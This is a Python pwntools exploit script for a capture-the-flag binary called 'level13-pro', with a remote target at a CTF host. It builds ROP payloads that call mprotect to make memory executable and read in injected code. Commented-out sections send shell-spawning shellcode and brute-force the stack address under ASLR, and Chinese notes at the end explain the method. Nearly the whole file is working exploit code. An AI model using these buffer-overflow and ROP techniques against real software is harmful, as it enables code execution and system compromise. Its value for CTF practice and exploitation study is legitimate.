#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>
from pwn import *
context.log_level="debug"
pwn_file="./level13-pro"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 22013)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


inject_pos = 0x8048500

# about mprotect
eax_val = 0x7d
ebx_val = 0x8048000
ecx_val = 0x1000
edx_val = 0x7

# used addr in .text
ris_call   = 0x80480fe
read_addr  = 0x80480E1
write_addr = 0x80480F9
#next_pos   = 0x804817C
bug_func = 0x804811e

payload0 = 'a'*0x10 + p32(write_addr) + p32(bug_func) + p32(1) + p32(0x8048000) + p32(eax_val)
payload1 = 'a'*0x10 + p32(ris_call) + p32(bug_func) + p32(ebx_val) + p32(ecx_val) + p32(edx_val)

payload2 = 'a'*0x10 + p32(read_addr) + p32(inject_pos) + p32(0)+ p32(inject_pos) + p32(0x80) 

r.recvuntil("ROP like a PRO:")
debug()
r.send(payload0)
r.recvline()
r.send(payload1)
r.recvline()
r.send(payload2)
r.recvline()

r.interactive()


'''
# where to paste stack
stack_start = 0xfffdd000
stack_offset =(0xffffd47c - stack_start) + 0x24
stack_paste_addr = stack_start + stack_offset 
'''


'''
pudlen= 0x20-3*4

# first read
payload= 'a'*0x10 + p32(read_addr) + p32(next_pos)+ p32(0)+p32(stack_paste_addr)+p32(0x200) 

# second read
payload+= 'a'*pudlen
payload+=p32(write_addr) + p32(next_pos) + p32(1)+p32(0x8048000) + p32(eax_val) + 'a'*pudlen
payload+=p32(ris_call) + p32(next_pos) + p32(ebx_val) + p32(ecx_val)+p32(edx_val)+'a'*pudlen
payload+=p32(read_addr) + p32(inject_pos)
payload+=p32(0)+ p32(inject_pos) + p32(0x80)
'''
'''
r.recvuntil("ROP like a PRO:")
debug()
r.sendline(payload)
r.recvline()
# shellcode
sh = asm(shellcraft.sh())
r.sendline(sh)

r.interactive()

# 先本地关掉aslr测试，然后爆地址
#for i in range(0x1000):
id_=0
while True:
    id_+=1
    #i = 0xf00
    #stack_start_addr =  i*0x1000 + 0xff*0x1000000
    #print hex(stack_start_addr)
    #stack_paste_addr = stack_offset + stack_start_addr
    stack_paste_addr = 0xffd0dee0 + 0x20 + 4
    try:
       ir = process("./level13-pro") #remote("pwn.sixstars.team",22013 )#process("./level13-pro")
       ir.recvuntil("ROP like a PRO:")
       payload = payload[:0x1c]+ p32(stack_paste_addr) + payload[0x20:]
       ir.sendline(payload)
       print id_
       w=ir.recvline()
       print w
       sh = asm(shellcraft.sh())
       ir.sendline(sh)
       ir.sendline("cat flag")
       print "test"
       w=ir.recv()
       print "test2"
       print w
       print id_
    except:
       print "wrong addr"
       ir.close()
    else:
       ir.interactive()
       print hex(stack_paste_addr)
       break


11题中， 移除后构造rop，先开bss权限，写到bss后，执行；控rax：利用写出的bytes数目；
和11题的区别是溢出后，能够控制的长度不够长；； 解决方案是
: 利用前5个构造一个读入操作，假设已知当前esp的位置，将rop chain写到它的后面；
剩下思路就和11题相同；
由于aslr开启的情况下，栈加载的位置16进制形式后三位不变，前两位是ff，故每次猜测正确的概率是1/4096
随机爆栈即可
# 开启aslr的情况下，跟踪某一次执行时ebp的位置；
就假定栈地址加载到一定位置时，esp执行的位置一定
'''
